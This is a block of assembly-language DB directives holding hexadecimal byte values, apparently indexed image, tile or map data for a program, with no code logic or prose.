DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,008H,00AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,00FH,017H,01AH
DB 01AH,013H,004H,000H,003H,01BH,003H,01CH,003H,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,009H,006H,006H,007H,008H,008H,007H,006H,005H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,00AH,006H,008H,005H,004H,002H,009H,002H,009H
DB 002H,009H,002H,009H,001H,004H,004H,005H,008H,00AH,002H,003H,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01CH,003H
DB 01CH,003H,01CH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 003H,007H,007H,005H,004H,001H,009H,002H,009H,002H,009H,002H,009H,001H,009H
DB 001H,009H,005H,006H,00AH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,005H
DB 007H,006H,007H,005H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,00BH,00AH,018H,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,013H,017H,01AH,01AH,013H,004H
DB 000H,000H,003H,01BH,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,003H,005H,007H,006H,007H,008H,009H,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,00AH,006H,008H,004H,001H,009H,002H,009H,002H,009H,002H,009H
DB 002H,009H,001H,004H,005H,008H,00AH,004H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,003H,01CH,003H,01CH,003H,01CH,003H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,01BH,003H,01BH,003H
DB 01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,007H,008H
DB 005H,004H,004H,001H,009H,002H,002H,002H,009H,002H,009H,001H,004H,001H,005H
DB 007H,00AH,002H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,003H,01BH,003H,01BH,00FH,011H,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,013H,017H,01AH,01AH,013H,004H,000H,000H,000H
DB 003H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,002H
DB 00AH,007H,005H,004H,004H,001H,009H,002H,009H,002H,009H,002H,009H,001H,004H
DB 004H,005H,008H,006H,004H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 003H,01BH,003H,01BH,003H,01BH,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,003H,01CH,003H,01BH,003H,01BH,003H,01BH,003H,01BH,003H,01BH,003H
DB 01CH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,007H,008H,005H,004H,001H
DB 009H,001H,004H,001H,002H,002H,009H,001H,009H,001H,005H,005H,007H,00AH,003H
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,003H,01BH,000H,005H,00AH,017H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,013H,017H,01AH,01AH,013H,004H,000H,000H,000H,000H,003H,01BH
DB 003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00AH,007H,005H
DB 005H,001H,009H,002H,009H,002H,009H,005H,005H,004H,009H,001H,004H,005H,008H
DB 00AH,009H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01CH,003H,01BH,003H,01BH
DB 003H,01BH,003H,01BH,003H,01BH,003H,01CH,003H,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH
DB 003H,01BH,003H,000H,000H,000H,000H,000H,000H,000H,000H,000H,003H,01BH,003H
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,008H,007H,005H,004H,004H,001H,008H,007H
DB 008H,004H,009H,002H,009H,001H,004H,005H,008H,007H,006H,01BH,003H,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H
DB 000H,000H,00DH,00AH,018H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 013H,017H,01AH,01AH,013H,005H,000H,000H,000H,000H,000H,003H,01BH,003H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,007H,006H,008H,005H,004H,001H
DB 009H,002H,009H,005H,007H,006H,007H,004H,004H,004H,005H,007H,00AH,01BH,003H
DB 01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,01BH,003H,000H,000H,000H,000H,000H
DB 000H,000H,000H,000H,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,01BH,000H,000H
DB 000H,002H,009H,004H,004H,002H,000H,000H,000H,000H,000H,01BH,003H,01CH,01CH
DB 01CH,01CH,01CH,01CH,005H,006H,005H,005H,004H,005H,006H,00AH,006H,005H,002H
DB 009H,001H,009H,004H,005H,008H,006H,008H,003H,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,000H,000H,000H,000H
DB 00EH,00AH,015H,018H,019H,018H,018H,018H,018H,018H,018H,018H,018H,018H,018H
DB 018H,018H,018H,018H,018H,018H,018H,018H,018H,018H,018H,017H,00FH,016H,018H
DB 017H,00FH,001H,000H,000H,000H,000H,000H,01BH,003H,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,005H,006H,008H,005H,004H,004H,001H,009H,002H
DB 005H,006H,00AH,006H,005H,004H,005H,008H,006H,007H,003H,01CH,01CH,01CH,01CH
DB 01CH,003H,01BH,003H,000H,000H,000H,000H,002H,009H,001H,009H,002H,000H,000H
DB 000H,000H,000H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,000H,000H,004H,006H,00AH,011H,011H
DB 011H,011H,011H,00AH,007H,002H,000H,000H,000H,000H,003H,01CH,01CH,01CH,01CH
DB 01CH,00BH,006H,008H,005H,004H,005H,006H,00AH,006H,005H,009H,001H,009H,001H
DB 005H,005H,008H,00AH,009H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,004H,005H,004H,004H,004H,00FH,00AH
DB 00DH,00DH,00DH,00AH,00AH,00DH,00DH,00DH,00AH,00AH,00AH,00DH,00DH,00DH,00DH
DB 00DH,00DH,00DH,00DH,00DH,00DH,00DH,00DH,00DH,00DH,00DH,00CH,00DH,00DH,00EH
DB 004H,004H,001H,004H,004H,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,00AH,007H,008H,005H,004H,004H,001H,009H,004H,007H,006H
DB 007H,005H,005H,005H,008H,00AH,00BH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H
DB 000H,000H,002H,007H,00AH,011H,011H,011H,011H,011H,00AH,006H,004H,000H,000H
DB 000H,000H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,003H,01BH,003H,000H,009H,006H,011H,00AH,00AH,00AH,00AH,00AH,00AH,00AH
DB 00AH,011H,011H,006H,002H,000H,000H,000H,003H,01CH,01CH,01CH,01CH,01CH,00AH
DB 007H,008H,005H,005H,008H,007H,008H,004H,001H,004H,004H,004H,005H,008H,006H
DB 007H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,003H,00FH,011H,015H,015H,015H,015H,015H,015H,015H,015H
DB 011H,011H,015H,015H,011H,00AH,00FH,00DH,00DH,00DH,00DH,00DH,00DH,00DH,010H
DB 00DH,013H,00AH,015H,015H,015H,015H,015H,015H,015H,015H,014H,013H,015H,015H
DB 016H,00DH,001H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,008H,00AH,008H,005H,005H,004H,004H,001H,004H,005H,008H,005H,005H,005H
DB 008H,006H,006H,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,000H,009H,006H,011H
DB 011H,00AH,00AH,00AH,00AH,00AH,00AH,00AH,00AH,011H,006H,002H,000H,000H,000H
DB 003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H
DB 000H,008H,00AH,00AH,006H,007H,007H,007H,007H,007H,006H,006H,00AH,00AH,00AH
DB 011H,011H,005H,000H,000H,000H,003H,01CH,01CH,01CH,01CH,005H,00AH,007H,008H
DB 005H,005H,005H,004H,004H,004H,004H,005H,005H,008H,007H,00AH,001H,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 003H,01BH,00DH,015H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,011H,017H,01AH
DB 01AH,019H,00AH,00DH,008H,008H,008H,008H,008H,008H,008H,005H,008H,00FH,00AH
DB 019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,017H,014H,01AH,01AH,019H,00DH,009H
DB 01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,007H
DB 006H,008H,008H,005H,004H,004H,004H,004H,004H,005H,005H,008H,006H,00AH,001H
DB 01CH,01CH,01CH,01CH,003H,01BH,003H,000H,005H,011H,011H,00AH,00AH,006H,006H
DB 006H,007H,007H,007H,007H,007H,006H,00AH,00AH,008H,000H,000H,000H,003H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,000H,007H,00AH,007H
DB 008H,008H,008H,008H,008H,008H,008H,008H,007H,007H,006H,00AH,00AH,00AH,011H
DB 007H,000H,000H,000H,003H,01CH,01CH,01CH,01CH,007H,00AH,007H,008H,005H,005H
DB 005H,005H,005H,005H,005H,008H,007H,00AH,004H,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,00DH
DB 015H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,011H,017H,01AH,01AH,019H,00AH
DB 00DH,008H,00EH,008H,00EH,008H,008H,008H,008H,008H,00FH,00AH,019H,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,017H,014H,01AH,01AH,019H,00DH,001H,003H,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,007H,00AH,007H
DB 008H,005H,005H,005H,005H,008H,008H,007H,006H,00AH,001H,01CH,01CH,01CH,01CH
DB 003H,01BH,003H,000H,007H,011H,00AH,00AH,006H,006H,007H,007H,008H,008H,008H
DB 008H,008H,008H,008H,008H,007H,00AH,007H,000H,000H,01BH,003H,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,008H,00AH,007H,008H,008H,005H,005H
DB 005H,005H,005H,005H,005H,008H,008H,007H,007H,006H,00AH,00AH,011H,008H,000H
DB 000H,01BH,003H,01CH,01CH,01CH,01CH,008H,00AH,006H,007H,008H,008H,008H,008H
DB 008H,007H,006H,00AH,001H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,00DH,015H,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,015H,017H,01AH,01AH,019H,00AH,00DH,008H,008H
DB 008H,00EH,00EH,008H,008H,008H,008H,00FH,00AH,019H,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,017H,014H,01AH,01AH,019H,00DH,009H,01BH,003H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,008H,00AH,006H,007H,007H
DB 008H,007H,007H,006H,00AH,007H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,000H
DB 008H,011H,00AH,00AH,006H,007H,007H,008H,008H,008H,005H,005H,005H,005H,005H
DB 005H,008H,008H,007H,00AH,008H,000H,000H,01BH,003H,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,003H,01BH,004H,00AH,007H,008H,008H,005H,005H,004H,004H,004H,004H
DB 004H,005H,005H,005H,008H,008H,007H,006H,00AH,00AH,011H,009H,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,001H,007H,00AH,00AH,006H,006H,006H,006H,006H,006H
DB 001H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,00DH,015H,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,015H,017H,01AH,01AH,019H,00AH,00FH,008H,008H,008H,00EH,008H
DB 008H,008H,008H,008H,00FH,00AH,019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,017H
DB 014H,01AH,01AH,019H,00DH,001H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00BH,008H,006H,006H,00AH,00AH,006H
DB 007H,00BH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,009H,011H,00AH,00AH
DB 006H,007H,008H,008H,008H,005H,005H,004H,004H,004H,004H,004H,005H,005H,008H
DB 008H,007H,00AH,004H,000H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 003H,00AH,006H,008H,008H,005H,005H,004H,004H,004H,004H,001H,004H,001H,004H
DB 005H,005H,008H,008H,007H,006H,00AH,00AH,00AH,000H,000H,003H,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,00BH,005H,007H,007H,008H,005H,00BH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,003H,01BH,00DH,015H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 015H,017H,01AH,01AH,019H,00AH,00FH,008H,008H,008H,008H,00EH,008H,008H,008H
DB 008H,00FH,00AH,019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,017H,014H,01AH,01AH
DB 019H,00DH,004H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,001H,00BH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,00AH,00AH,00AH,006H,007H,008H,008H
DB 005H,005H,004H,004H,004H,001H,004H,004H,004H,004H,005H,005H,008H,008H,006H
DB 00AH,000H,000H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,004H,006H,007H
DB 008H,005H,005H,004H,004H,001H,009H,001H,009H,001H,009H,001H,004H,004H,005H
DB 005H,008H,007H,006H,00AH,011H,007H,000H,01BH,003H,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,003H,00DH,015H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,015H,017H,01AH
DB 01AH,019H,00AH,00FH,008H,008H,008H,008H,008H,008H,008H,008H,008H,00FH,00AH
DB 019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,017H,014H,01AH,01AH,019H,00DH,001H
DB 003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,003H,007H,011H,00AH,006H,007H,008H,005H,005H,004H,004H,001H
DB 009H,001H,009H,001H,009H,001H,004H,004H,005H,005H,008H,008H,006H,007H,000H
DB 01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,008H,006H,008H,005H,005H,004H
DB 004H,001H,009H,001H,009H,001H,009H,002H,009H,001H,009H,004H,005H,005H,008H
DB 007H,006H,00AH,00AH,000H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,00DH
DB 015H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,015H,015H,01AH,01AH,019H,00AH
DB 00FH,008H,008H,008H,008H,008H,008H,008H,008H,008H,00FH,00AH,019H,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,017H,014H,01AH,01AH,019H,00DH,009H,01BH,003H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H
DB 01BH,00AH,00AH,006H,007H,008H,005H,004H,001H,009H,001H,009H,001H,009H,001H
DB 009H,001H,009H,001H,004H,004H,005H,005H,008H,007H,00AH,002H,003H,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,003H,006H,007H,008H,005H,004H,004H,001H,009H,001H
DB 009H,002H,009H,002H,009H,001H,009H,001H,009H,001H,005H,005H,008H,007H,00AH
DB 00AH,009H,000H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,00DH,015H,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,015H,015H,01AH,01AH,019H,00AH,00FH,008H,008H
DB 008H,008H,008H,008H,008H,008H,008H,00FH,00AH,019H,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,017H,014H,01AH,01AH,019H,00DH,001H,003H,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
